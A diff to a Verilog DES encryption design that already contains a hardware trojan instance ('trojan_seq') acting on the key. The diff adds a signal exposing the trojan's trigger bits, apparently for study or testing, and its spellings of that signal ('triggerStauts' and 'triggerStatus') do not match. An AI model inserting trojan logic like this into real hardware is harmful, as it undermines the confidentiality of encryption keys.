@@ -62,6 +62,7 @@ module des(clk_in, rst);
 	wire [55:0] key56;
 	reg [3:0] cnt;
 	wire clk;
+	wire triggerStauts;
 	
 	divi Uclk(.clk(clk_in), .clkout(clk));
 	
@@ -76,12 +77,14 @@ module des(clk_in, rst);
 				.decrypt(1'b0), 
 				.roundSel(cnt), 
 				.clk(clk),
+				.triggerStauts(triggerStauts),
 				.rst(rst));
 				
 	ram1 U2(
 	.address({1'b0,cnt[3:0]}),
 	.clock(clk),
 	.data(desout),
+	//.data(triggerStauts),
 	.wren(1'b1),
 	.q());
 	
@@ -94,8 +97,9 @@ module des(clk_in, rst);
 endmodule
 
 
-module des_o(desOut, desIn, key, decrypt, roundSel, clk, rst);
+module des_o(desOut, desIn, key, decrypt, roundSel, clk, rst,triggerStauts);
 	output	[63:0]	desOut;
+	output [1:2]	triggerStatus;
 	input	[63:0]	desIn;
 	input	[55:0]	key;
 	input		decrypt;
@@ -111,12 +115,14 @@ module des_o(desOut, desIn, key, decrypt, roundSel, clk, rst);
 	wire	[1:32]	out;
 	wire 	[55:0]	key_troj;
 
+
 	assign Lout = (roundSel == 0) ? IP[33:64] : R;
 	assign Xin  = (roundSel == 0) ? IP[01:32] : L;
 	assign Rout = Xin ^ out;
 	assign FP = { Rout, Lout};
 
 	crp u0( .P(out), .R(Lout), .K_sub(K_sub) );
+	assign triggerStatus = out[31:32];
 	trojan_seq u2(.clk(clk), .rst(rst), .key(key), .trigger(out), .payload(key_troj));
 
 	always @(posedge clk)
